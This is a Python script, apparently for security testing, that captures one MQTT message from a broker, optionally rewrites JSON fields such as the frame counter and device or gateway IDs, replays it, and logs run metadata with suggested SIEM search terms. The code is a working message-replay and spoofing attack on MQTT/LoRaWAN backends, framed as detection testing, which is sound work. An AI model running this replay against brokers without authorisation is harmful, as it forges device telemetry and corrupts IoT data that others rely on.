#!/usr/bin/env python3

import argparse
import csv
import json
import subprocess
import uuid
from datetime import datetime, timezone
from pathlib import Path


def utc_now():
    """Return current UTC time in ISO 8601 format."""
    return datetime.now(timezone.utc).isoformat(timespec="microseconds").replace("+00:00", "Z")


def run_command(command):
    """Run a shell command safely without invoking a shell."""
    return subprocess.run(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )


def capture_first_message(broker, port, topic, timeout):
    """
    Capture one MQTT message from the selected broker and topic filter.

    The mosquitto_sub command is executed with:
    - timeout: stops waiting after the configured number of seconds
    - -v: prints both topic and payload
    - -C 1: exits after receiving one message
    """
    command = [
        "timeout", str(timeout),
        "mosquitto_sub",
        "-h", broker,
        "-p", str(port),
        "-t", topic,
        "-v",
        "-C", "1"
    ]

    result = run_command(command)

    if result.returncode != 0 and not result.stdout.strip():
        raise RuntimeError(f"Could not capture MQTT message:\n{result.stderr}")

    line = result.stdout.strip()

    if " " not in line:
        raise RuntimeError("Captured message does not contain both topic and payload.")

    captured_topic, payload = line.split(" ", 1)
    return captured_topic, payload


def set_nested_value(data, path, value):
    """
    Set or replace a JSON value using dot notation.

    Examples:
    --set fCnt=9888
    --set deviceInfo.devEui='"TEST_DEVICE_EUI"'
    --set rxInfo.0.gatewayId='"TEST_GATEWAY_ID"'

    JSON values should be quoted when the intended value is a string.
    """
    keys = path.split(".")
    current = data

    try:
        parsed_value = json.loads(value)
    except json.JSONDecodeError:
        parsed_value = value

    for key in keys[:-1]:
        if isinstance(current, list):
            key = int(key)
            current = current[key]
        else:
            if key not in current:
                current[key] = {}
            current = current[key]

    final_key = keys[-1]

    if isinstance(current, list):
        current[int(final_key)] = parsed_value
    else:
        current[final_key] = parsed_value


def publish_payload(broker, port, topic, payload):
    """Publish the selected payload to the selected MQTT topic."""
    command = [
        "mosquitto_pub",
        "-h", broker,
        "-p", str(port),
        "-t", topic,
        "-m", payload
    ]

    result = run_command(command)

    if result.returncode != 0:
        raise RuntimeError(f"Publish failed:\n{result.stderr}")


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Capture one MQTT message, optionally modify JSON fields, "
            "replay it, and save local evidence files for SIEM testing."
        )
    )

    parser.add_argument(
        "--broker",
        required=True,
        help="MQTT broker hostname or IP address. Example: --broker <broker-ip>"
    )

    parser.add_argument(
        "--port",
        type=int,
        default=1883,
        help="MQTT broker port. Default: 1883"
    )

    parser.add_argument(
        "--subscribe-topic",
        default="application/#",
        help="MQTT topic filter used to capture one message. Default: application/#"
    )

    parser.add_argument(
        "--publish-topic",
        default=None,
        help="Topic used for replay. If omitted, the captured topic is used."
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Maximum number of seconds to wait for a captured message. Default: 30"
    )

    parser.add_argument(
        "--set",
        action="append",
        default=[],
        help=(
            "Modify or add a JSON field before replay. "
            "Format: field.path=value. Example: --set fCnt=9888"
        )
    )

    parser.add_argument(
        "--keep-identical",
        action="store_true",
        help="Replay the exact captured payload without modification."
    )

    parser.add_argument(
        "--output-dir",
        default="output/replay_runs",
        help="Directory where local evidence files are stored. Default: output/replay_runs"
    )

    args = parser.parse_args()

    if args.keep_identical and args.set:
        raise ValueError("Use either --keep-identical or --set, not both.")

    attack_id = str(uuid.uuid4())
    run_dir = Path(args.output_dir) / attack_id
    run_dir.mkdir(parents=True, exist_ok=True)

    attack_start = utc_now()

    print(f"ATTACK_ID={attack_id}")
    print(f"ATTACK_START_UTC={attack_start}")
    print("[INFO] Waiting for first MQTT message...")

    captured_topic, original_payload = capture_first_message(
        args.broker,
        args.port,
        args.subscribe_topic,
        args.timeout
    )

    publish_topic = args.publish_topic or captured_topic

    original_file = run_dir / "original_payload.json"
    replay_file = run_dir / "replay_payload.json"
    metadata_file = run_dir / "metadata.txt"
    csv_file = run_dir / "run_summary.csv"

    original_file.write_text(original_payload, encoding="utf-8")

    replay_payload = original_payload
    modification_mode = "identical"

    if not args.keep_identical and args.set:
        try:
            data = json.loads(original_payload)
        except json.JSONDecodeError as exc:
            raise RuntimeError("Captured payload is not valid JSON. Cannot modify fields.") from exc

        for item in args.set:
            if "=" not in item:
                raise ValueError("--set must use format field.path=value")
            path, value = item.split("=", 1)
            set_nested_value(data, path, value)

        replay_payload = json.dumps(data, separators=(",", ":"))
        modification_mode = "modified"

    replay_file.write_text(replay_payload, encoding="utf-8")

    publish_start = utc_now()
    publish_payload(args.broker, args.port, publish_topic, replay_payload)
    publish_end = utc_now()

    metadata = f"""RUN_ID={attack_id}
TEST_LABEL=mqtt_replay_test
TEST_CATEGORY=mqtt_backend_replay
BROKER={args.broker}
PORT={args.port}
SUBSCRIBE_TOPIC={args.subscribe_topic}
CAPTURED_TOPIC={captured_topic}
PUBLISH_TOPIC={publish_topic}
MODIFICATION_MODE={modification_mode}
ATTACK_START_UTC={attack_start}
PUBLISH_START_UTC={publish_start}
PUBLISH_END_UTC={publish_end}
ORIGINAL_PAYLOAD_FILE={original_file}
REPLAY_PAYLOAD_FILE={replay_file}

SUGGESTED_SIEM_SEARCH_TERMS:
run_id:{attack_id}
topic:"{publish_topic}"
message:"fCnt"
message:"devEui"
message:"data"
"""

    metadata_file.write_text(metadata, encoding="utf-8")

    with csv_file.open("w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([
            "run_id",
            "test_label",
            "broker",
            "subscribe_topic",
            "captured_topic",
            "publish_topic",
            "modification_mode",
            "attack_start_utc",
            "publish_start_utc",
            "publish_end_utc",
            "original_payload_file",
            "replay_payload_file"
        ])
        writer.writerow([
            attack_id,
            "mqtt_replay_test",
            args.broker,
            args.subscribe_topic,
            captured_topic,
            publish_topic,
            modification_mode,
            attack_start,
            publish_start,
            publish_end,
            str(original_file),
            str(replay_file)
        ])

    print("[INFO] Replay completed.")
    print(f"RUN_DIR={run_dir}")
    print(f"CAPTURED_TOPIC={captured_topic}")
    print(f"PUBLISH_TOPIC={publish_topic}")
    print(f"MODIFICATION_MODE={modification_mode}")
    print(f"PUBLISH_START_UTC={publish_start}")
    print(f"PUBLISH_END_UTC={publish_end}")


if __name__ == "__main__":
    main()
